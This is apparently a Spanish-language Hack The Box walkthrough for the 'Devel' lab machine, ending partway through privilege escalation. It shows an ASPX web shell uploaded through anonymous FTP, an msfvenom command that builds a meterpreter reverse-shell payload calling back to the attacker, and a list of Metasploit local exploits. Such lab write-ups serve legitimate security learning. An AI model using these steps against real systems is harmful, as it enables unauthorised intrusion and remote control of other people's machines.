# Devel ![Avatar](https://www.hackthebox.eu/storage/avatars/0fb6455a29eb4f2682f04a780ce26cb1_thumb.png)     

### Initial Scan

```nmap
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```
### Enumeration

####FTP

Empecemos enumerando el FTP
```bash
pj@crow-foot:~$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:pj): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> cd aspnet_client
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```
Vemos que lo que tenemos es el directorio de la pagina que hay en el puerto 80, puede que podamos subir una shell

### Exploit

Usaremos una shell aspx por que es un cliente aspnet
```
https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/laudanum-0.8/aspx/shell.aspx
```
La descargamos y la subimos al FTP
```ftp
put shell.aspx
```
Y accedmos a http://10.10.10.5/shell.aspx

### Privesc

Ya tenemos shell en la máquina

#### Enumeración de Usuarios

```
 Directory of C:\Users

18/03/2017  02:16 §£    <DIR>          .
18/03/2017  02:16 §£    <DIR>          ..
18/03/2017  02:16 §£    <DIR>          Administrator
17/03/2017  05:17 ££    <DIR>          babis
18/03/2017  02:06 §£    <DIR>          Classic .NET AppPool
14/07/2009  10:20 §£    <DIR>          Public
```
No tenemos acceso a ninguno pero sabemos que los usuarios con flag son babis y Administrator ya que el actual no tiene acceso a ninguna flag

#### Versiones y hotfixes

Ejecutamos el comando systeminfo aún desde la webshell
```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ££
System Boot Time:          1/8/2020, 1:44:56 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 652 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.503 MB
Virtual Memory: In Use:    544 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```
De aquí sacamos que tenemos un windows 7 de 32 bits y sin parchear

#### Convirtiendo la web shell en reverse shell
Generamos una Rev Shell con msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx  > shell.aspx
```
Subimos la revshell al FTP y nos conectamos a ella aprovechando que la hemos generado con msfvenom vamos a usar el exploit sugester de metasploit para poder encontrar una manera de elevar privilegios en la máquina
```
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
Veamos si alguno se puede hacer de manera cómoda


